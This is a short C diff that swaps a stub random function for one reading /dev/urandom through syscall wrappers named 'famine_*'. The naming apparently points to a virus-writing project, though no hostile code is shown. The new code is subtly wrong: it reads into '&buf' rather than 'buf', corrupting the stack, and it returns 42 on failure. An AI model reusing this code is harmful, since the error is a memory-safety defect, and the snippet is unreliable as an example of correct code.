@@ -1,9 +1,18 @@
 
 #include <sys/types.h>
+#include "syscall.h"
 
-int	ft_rand(void)
+ssize_t	ft_getrandom(void *buf, size_t buflen)
 {
-	return 42;
+	const char	path[13] = {'/','d','e','v','/','u','r','a','n','d','o','m','\0'};
+	int		fd;
+	ssize_t		nbr_bytes;
+
+	fd = famine_open(path, O_RDONLY);
+	if (fd < 0) return 42;
+	nbr_bytes = famine_read(fd, &buf, buflen);
+	famine_close(fd);
+	return nbr_bytes;
 }
 
 void	ft_bzero(void *ptr, size_t size)
